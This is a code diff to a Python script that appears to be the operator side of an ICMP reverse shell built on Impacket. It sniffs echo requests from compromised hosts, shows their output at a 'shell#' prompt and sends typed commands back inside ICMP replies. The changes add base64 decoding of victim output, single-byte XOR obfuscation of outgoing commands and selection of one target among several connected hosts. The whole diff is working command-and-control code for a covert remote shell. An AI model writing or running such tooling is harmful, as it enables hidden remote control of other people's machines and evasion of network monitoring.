@@ -24,6 +24,7 @@ import select
 import socket
 import subprocess
 import sys
+import base64
 
 def setNonBlocking(fd):
     """
@@ -35,6 +36,15 @@ def setNonBlocking(fd):
     flags = fcntl.fcntl(fd, fcntl.F_GETFL)
     flags = flags | os.O_NONBLOCK
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
+
+def xor_encrypt(aString, key):
+        kIdx = 0
+        cryptStr = ""   
+        for x in range(len(aString)):
+            cryptStr = cryptStr + chr( ord(aString[x]) ^ ord(key[kIdx]))
+            kIdx = (kIdx + 1) % len(key)
+
+        return cryptStr
 
 def main():
     if subprocess.mswindows:
@@ -76,7 +86,9 @@ def main():
 
     # Instantiate an IP packets decoder
     decoder = ImpactDecoder.IPDecoder()
-
+    first = 'none'
+    cnt = 0
+    target = ''
     while 1:
         cmd = ''
 
@@ -94,7 +106,7 @@ def main():
             icmppacket = ippacket.child()
 
             # If the packet matches, report it to the user
-            if 8 == icmppacket.get_icmp_type():
+            if (cnt == 0 or target == ippacket.get_ip_src()) and 8 == icmppacket.get_icmp_type():
                 # Get identifier and sequence number
                 ip = ippacket
 		dst =  ippacket.get_ip_src()
@@ -102,14 +114,16 @@ def main():
   		ip.set_ip_src(src)
                 ip.set_ip_dst(dst)
 
-
 		ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
-                data = icmppacket.get_data_as_string()
-
-                if len(data) > 0:
-                    sys.stdout.write(data + "\nshell#" )
-
+                data = icmppacket.get_data_as_string()	
+		if (first != dst):
+			first = 'none'
+		reply = 'abcdefghi'
+                if (len(data) > 0) and (data.find(reply) == -1) and  ((target == dst) or (first == 'none')):
+			first  = dst
+		     	data = base64.b64decode(data)
+		     	sys.stdout.write(data + "\n<"+dst+">shell#" )
                 # Parse command from standard input
                 try:
                     cmd = sys.stdin.readline()
@@ -118,6 +132,9 @@ def main():
 
                 if cmd == 'exit\n':
                     return
+		elif cmd == dst + '\n':
+                    target = dst
+		    cnt += 1
 
                 # Set sequence number and identifier
                 icmp.set_icmp_id(ident)
@@ -127,26 +144,16 @@ def main():
                 icmp.set_icmp_cksum(0)
                 icmp.auto_checksum = 1
                 icmp.set_icmp_timeout = 0
-                
+		 
 	        # Include the command as data inside the ICMP packet
 		reply = 'abcdefghi'
                 # Send it to the target host
 		if (data.find(reply) == -1):
+		   cmd = xor_encrypt(cmd,"K")
+		   #cmd = base64.b64encode(cmd)
 		   icmp.contains(ImpactPacket.Data(cmd))
 		else:
-		   icmp.contains(ImpactPacket.Data(data))
-
-                 # Have the IP packet contain the ICMP packet (along with its payload)
-                ip.contains(icmp)
-
-
-	        # Include the command as data inside the ICMP packet
-		reply = 'abcdefghi'
-                # Send it to the target host
-		if (data.find(reply) == -1):
-		   icmp.contains(ImpactPacket.Data(cmd))
-		else:
-		   icmp.contains(ImpactPacket.Data(data))
+   	   	   icmp.contains(ImpactPacket.Data(data))
 
                  # Have the IP packet contain the ICMP packet (along with its payload)
                 ip.contains(icmp)
